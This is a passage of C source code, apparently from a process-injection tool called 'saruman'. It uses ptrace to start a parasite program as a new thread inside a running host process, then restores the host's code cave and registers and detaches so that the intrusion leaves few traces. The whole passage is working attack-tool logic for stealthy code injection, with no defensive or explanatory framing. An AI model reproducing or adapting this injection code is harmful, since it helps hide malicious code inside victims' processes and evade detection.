	saruman_debug("remote argv @ %#lx argc=%d\n",
	    remote_argv, saruman.parasite.main_argc);

	saruman.stack.rsp -= 0x400;
	saruman.stack.rsp &= ~0xfUL;

	char *pthread_args[] = {
	    (char *)saruman.parasite.entry_point,
	    NULL,
	    (char *)saruman.stack.rsp,
	    (char *)(uintptr_t)saruman.parasite.main_argc,
	    (char *)(uintptr_t)remote_argv
	};

	saruman_debug("Setting up remote thread\n");

	saruman_remote_call_init(&rpc, &create_thread, 1024,
	    pthread_args, 5);

	saruman_debug("Calling &create_thread(%#lx, NULL, %#lx, %d, %#lx\n",
	    saruman.parasite.entry_point, saruman.stack.rsp, saruman.parasite.main_argc,
	    remote_argv);

	if (saruman_remote_call(&saruman, &rpc) == false) {
		fprintf(stderr,
		    "saruman_remote_call() failed on create_thread()\n");
		exit(EXIT_FAILURE);
	}

	printf("Restoring code cave of host executable\n");

	if (saruman_restore_cave(&saruman) == false) {
		fprintf(stderr, "Failed restoring code cave in text region of main executable\n");
		exit(EXIT_FAILURE);
	}

	printf("Restoring register state of host executable\n");

	if (saruman_restore_register_state(&saruman) == false) {
		fprintf(stderr, "Failed to restore register state with PTRACE\n");
		exit(EXIT_FAILURE);
	}

	printf("Detaching from %d\n", saruman.task.pid);

	if (saruman_ptrace_detach(&saruman) == false) {
		fprintf(stderr, "saruman_ptrace_detach() failed on %d\n", saruman.task.pid);
		exit(EXIT_FAILURE);
	}

	exit(0);
}
